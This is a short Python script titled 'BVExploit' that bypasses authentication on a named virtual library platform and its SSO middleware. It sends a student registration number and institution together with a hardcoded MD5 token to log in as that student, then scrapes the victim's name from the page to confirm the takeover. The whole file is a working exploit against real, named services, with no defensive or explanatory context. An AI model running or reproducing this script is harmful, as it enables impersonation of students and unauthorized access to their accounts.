import requests
import sys
import re
import hashlib
import string

if len(sys.argv) != 3:
    print('Usage: ./BVExploit RA INSTITUTION')
    print('Example: ./BVExploit 99999999 unibh')
    sys.exit(0)

RA = sys.argv[1]
INSTITUTION = sys.argv[2]

SSO_URL = string.Template('https://middleware-bv.am4.com.br/SSO/$INSTITUTION').substitute(INSTITUTION=INSTITUTION)
LOGIN_URL = 'https://plataforma.bvirtual.com.br/Account/ExternalLogin'


token = hashlib.md5(b'0xDEADDEAD').hexdigest()

SSO_Payload = {'login': RA, 'token': token}
r = requests.post(SSO_URL, params=SSO_Payload)
r.close()

LOGIN_Payload = {'login': RA + '.' + INSTITUTION, 'token': token}
r = requests.get(LOGIN_URL, params=LOGIN_Payload)
r.close()

match = re.search('p class="text-hide">(.+)</p>\n\\s+<p', r.text)

if match:
    print(string.Template('Logged in as \033[1;32m$USER').substitute(USER=match.group(1)))
else:
    print('Could not retrieve the specified user, it can happen if the user has never logged in the BV Environment or'
          ' if he/she does not exist at all')
